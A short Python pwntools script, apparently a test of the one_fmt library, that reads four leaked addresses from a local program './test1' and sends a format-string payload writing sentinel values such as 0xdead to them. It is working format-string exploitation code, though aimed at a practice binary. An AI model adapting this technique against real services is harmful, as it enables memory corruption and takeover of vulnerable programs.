from one_fmt import *
from pwn import *

r = process("./test1", level="error")

fmt = Fmt(24)
r.recvuntil("@ ")
address1 = int(r.recvuntil(" ", drop=True), 16)
r.recvuntil("@ ")
address2 = int(r.recvuntil(" ", drop=True), 16)
r.recvuntil("@ ")
address3 = int(r.recvuntil(" ", drop=True), 16)
r.recvuntil("@ ")
address4 = int(r.recvuntil(" ", drop=True), 16)

r.recvuntil("say")
fmt[address1] = 0xdead
fmt[address2] = 0x1337
fmt[address3] = 0x4242
fmt[address4] = 0xbabe

fmt.index(address1, 10)
fmt.index(address2, 13)
fmt.index(address3, 16)
fmt.index(address4, 19)

payload = fmt.build(1)
print hexdump(payload)
print len(payload)

r.sendline(payload)
r.recvuntil("Value")
r.interactive()
